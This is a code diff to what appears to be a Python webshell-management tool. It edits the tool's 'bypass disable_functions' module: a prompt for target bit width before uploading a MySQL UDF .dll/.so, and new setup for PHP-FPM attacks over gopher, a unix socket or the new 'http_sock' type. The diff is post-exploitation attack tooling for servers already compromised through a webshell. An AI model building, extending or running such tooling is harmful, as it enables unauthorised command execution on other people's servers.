@@ -89,13 +89,21 @@ def set_mode(mode: int, test: bool = False):
             system = "windows" if (
                 gget("webshell.iswin", "webshell")) else "linux"
             print("\nReference Information:", gget("webshell.os_version", "webshell"))
-            print("\nInput target system bits (32/64/exit): ", end="")
+            print("\nInput target system bits (32/64/default): ", end="")
             bits = "64"
             _ = readline().strip()
             if (_ == "32"):
                 bits = 32
-            elif (_ in ["back", "exit", "quit"] or _ != "64"):
+            elif (_ == "64"):
+                bits = 64
+            elif (not _):
+                bits = gget("webshell.arch", namespace="webshell")
+                if not bits:
+                    print(color.red(f"\nUnknown architecture, please set it by yourself"))
+                    return False
+            elif (_ in ["back", "exit", "quit"]):
                 return False
+
             udf_ext = ".dll" if (gget("webshell.iswin", "webshell")) else ".so"
             udf_path = plugin_dir + "tmp" + udf_ext
             print(color.yellow(f"\nUpload {udf_ext[1:]}..."))
@@ -123,31 +131,33 @@ def set_mode(mode: int, test: bool = False):
         if (not res or "fpm" not in res.r_text):
             print(color.red(f"\nTarget php not run by php-fpm!\n"))
             return False
-        requirements_dict = {'host': '127.0.0.1', 'port': 9000, "php_file": "/usr/local/lib/php/PEAR.php"}
-        for k, v in requirements_dict.items():
-            new_v = input(f"{k}[{v}]:")
-            if k == 'port':
-                new_v = new_v if new_v else v
-                try:
-                    new_v = int(new_v)
-                except ValueError:
-                    print(color.red(f"\nPort must be number!\n"))
-                    return False
-            if new_v:
-                requirements_dict[k] = new_v
-        attack_type = input("attack_type[gopher/sock]:").lower()
-        if (attack_type not in ["gopher", "sock"]):
+        requirements_dict = {'host': '127.0.0.1', 'port': 9000}
+        attack_type = input("attack_type[gopher(need curl extension)/sock/http_sock]:").lower()
+        if (attack_type not in ["gopher", "sock", "http_sock"]):
             return False
+
+        gset("webshell.bdf_fpm.type", attack_type, True, "webshell")
+
         if (attack_type == "sock"):
             sock_path = "/var/run/php7-fpm.sock"
             new_v = input(f"sock_path[{sock_path}]:")
             if new_v:
                 sock_path = new_v
             gset("webshell.bdf_fpm.sock_path", sock_path, True, "webshell")
-        gset("webshell.bdf_fpm.host", requirements_dict["host"], True, "webshell")
-        gset("webshell.bdf_fpm.port", str(requirements_dict["port"]), True, "webshell")
-        gset("webshell.bdf_fpm.php_file", requirements_dict["php_file"], True, "webshell")
-        gset("webshell.bdf_fpm.type", attack_type, True, "webshell")
+        else:
+            for k, v in requirements_dict.items():
+                new_v = input(f"{k}[{v}]:")
+                if k == 'port':
+                    new_v = new_v if new_v else v
+                    try:
+                        new_v = int(new_v)
+                    except ValueError:
+                        print(color.red(f"\nport must be number\n"))
+                        return False
+                if new_v:
+                    requirements_dict[k] = new_v
+            gset("webshell.bdf_fpm.host", requirements_dict["host"], True, "webshell")
+            gset("webshell.bdf_fpm.port", str(requirements_dict["port"]), True, "webshell")
     if (not test):
         if (mode == 7):
             print(color.yellow(
